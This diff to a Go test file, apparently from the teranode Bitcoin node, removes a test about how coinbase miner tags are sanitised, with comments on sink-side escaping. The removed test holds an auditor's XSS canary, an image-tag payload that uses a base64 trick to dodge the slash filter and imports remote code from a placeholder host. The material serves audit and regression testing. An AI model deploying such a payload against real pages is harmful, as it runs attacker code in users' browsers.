@@ -683,37 +683,3 @@ func TestExtractCoinbaseMinerRawJSONRoundTrip(t *testing.T) {
 	require.NoError(t, json.Unmarshal(out, &decoded))
 	require.Equal(t, sanitized, decoded["miner"], "clean tags survive a JSON round-trip intact")
 }
-
-// The auditor's payload from bitcoin-sv/teranode#4844: 65 bytes, no literal '/', so it survives
-// the miner-tag sanitiser byte-for-byte and parses as markup.
-const minerMarkupCanary = `<img src=x onerror=import('https:'+atob('Ly8=')+'audit.invalid')>`
-
-// TestExtractMiner_MarkupIsPreservedByDesign is a policy characterization test, not a security
-// regression test: it passes on unfixed code. The security invariant is proved by the dashboard's
-// fork-viewer sink spec, which shows the sink neutralises both forms in a real browser.
-//
-// The position it pins is deliberate. The coinbase arbitrary-text field is consensus-visible chain
-// data; miner tags in the wild legitimately contain angle brackets, equals signs and quotes, and
-// blockchain_raw_miner_tag=true is a supported configuration that exists precisely to preserve the
-// bytes. A defence an operator can switch off with a config flag is not a defence, and escaping is
-// context-dependent - HTML-escaping at extraction would corrupt the value for the JSON API, the
-// RPC, the logs and the websocket feed. So the sanitiser keeps markup characters and every sink is
-// responsible for its own context.
-func TestExtractMiner_MarkupIsPreservedByDesign(t *testing.T) {
-	scriptSig := EncodeCoinbaseHeightPush(100)
-	scriptSig = append(scriptSig, minerMarkupCanary...)
-
-	tx := bt.NewTx()
-	require.NoError(t, tx.From("0000000000000000000000000000000000000000000000000000000000000000", 0xffffffff, "", 0))
-	tx.Inputs[0].UnlockingScript = bscript.NewFromBytes(scriptSig)
-	require.True(t, tx.IsCoinbase())
-
-	sanitized, err := ExtractCoinbaseMinerRaw(tx, false)
-	require.NoError(t, err)
-	require.Contains(t, sanitized, minerMarkupCanary,
-		"the default sanitiser keeps every printable character, so the markup survives byte-for-byte")
-
-	raw, err := ExtractCoinbaseMinerRaw(tx, true)
-	require.NoError(t, err)
-	require.Contains(t, raw, minerMarkupCanary, "the raw mode preserves the bytes, as documented")
-}
